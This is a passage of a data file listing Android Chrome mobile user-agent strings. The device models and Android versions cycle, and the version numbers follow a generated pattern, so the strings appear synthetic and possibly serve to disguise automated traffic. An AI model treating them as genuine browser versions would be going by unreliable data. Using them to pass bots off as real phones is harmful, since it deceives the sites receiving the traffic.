    "Mozilla/5.0 (Linux; Android 9; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.9675.245 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.9694.52 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.9713.59 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.9732.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.9751.73 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9770.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.9789.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9808.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.9827.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9846.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.9865.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9884.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.9903.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.9922.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.9941.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.9960.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.9979.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.9998.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1018.171 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1037.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1056.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1075.192 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1094.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1113.206 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1132.213 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1151.220 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1170.227 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1189.234 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1208.241 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1227.248 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1246.55 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1265.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1284.69 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1303.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1322.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1341.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1360.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1379.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1398.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1417.118 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1436.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1455.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1474.139 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1493.146 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1512.153 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1531.160 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1550.167 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1569.174 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1588.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1607.188 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1626.195 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1645.202 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1664.209 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1683.216 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1702.223 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1721.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1740.237 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1759.244 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1778.51 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1797.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1816.65 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1835.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1854.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1873.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1892.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1911.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1930.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1949.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1968.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1987.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2006.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2025.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2044.149 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2063.156 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2082.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2101.170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2120.177 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2139.184 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2158.191 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2177.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2196.205 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2215.212 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.2234.219 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.2253.226 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2272.233 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2291.240 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2310.247 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2329.54 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2348.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.2367.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2386.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2405.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2424.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2443.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2462.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2481.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2500.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2519.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2538.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2557.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2576.145 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2595.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.2614.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.2633.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2652.173 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2671.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2690.187 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2709.194 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2728.201 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.2747.208 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2766.215 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2785.222 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2804.229 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2823.236 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2842.243 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2861.50 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2880.57 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2899.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2918.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2937.78 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2956.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2975.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.2994.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3013.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3032.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3051.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3070.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3089.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3108.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3127.148 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3146.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3165.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3184.169 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3203.176 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3222.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3241.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3260.197 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3279.204 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3298.211 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3317.218 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3336.225 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3355.232 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3374.239 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3393.246 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3412.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3431.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3450.67 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3469.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3488.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3507.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3526.95 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3545.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3564.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3583.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3602.123 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3621.130 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3640.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3659.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3678.151 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3697.158 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3716.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3735.172 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3754.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3773.186 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3792.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3811.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3830.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3849.214 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3868.221 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3887.228 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3906.235 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3925.242 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3944.249 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3963.56 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3982.63 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4001.70 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4020.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4039.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4058.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4077.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4096.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4115.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4134.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4153.126 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4172.133 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4191.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4210.147 Mobile Safari/537.36",
